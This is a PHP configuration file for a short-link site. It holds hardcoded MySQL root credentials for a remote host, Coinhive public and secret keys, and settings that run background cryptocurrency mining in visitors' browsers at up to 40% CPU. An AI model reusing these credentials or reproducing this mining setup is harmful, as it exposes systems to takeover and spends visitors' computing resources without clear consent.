<?php
// ====================Database Configuration====================
$pdo_dsn = 'mysql:dbname=shortlink;host=ns0.nide8.com;port=30330';
$pdo_user = 'root';
$pdo_pass = 'sunnyside666';
//Links table
$pdo_table = 'links';
$pdo_cookies_table = 'cookies';
$pdo_stats_table = 'stats';
// ==============================================================


// ====================Coinhive Configuration====================
$ch_public_key = 'pl4XkAHMYAxFz1ydCUaqHR5entiVZW0e'; // Your site public key
$ch_secret_key = '8U1ilzV9ZjEpb2sDNsTlaOpn8x8XkZ2i'; // Your site secret key
$ch_hasehs = 1024; // How many hashes allow users passed captcha? Min:256

$ch_host = 'https://authedmine.com/lib/captcha.min.js';
// There have 2 host you can choose
// https://authedmine.com/lib/captcha.min.js (AdBlock Friendly)
// https://coinhive.com/lib/captcha.min.js (Auto verify and mining in background support)

$ch_enable_background_mining = true;
// Background mining need set $ch_host to https://authedmine.com/lib/captcha.min.js

$ch_background_mining_free_percent = '0.6';
// 0.6 = 60% cpu free(use 40%)   0.1 = 10% cpu free(use 90%)
// Need switch $ch_enable_background_mining to true

$ch_background_mining_disable_on_mobile = true;
//T urn on this maybe can improve mobile user experience, But possible user can use UA to disable background mining.
// ==============================================================


// ==================Captcha Page Configuration==================

// About mining page you can edit it by yourself in showCaptcha.php

// ==============================================================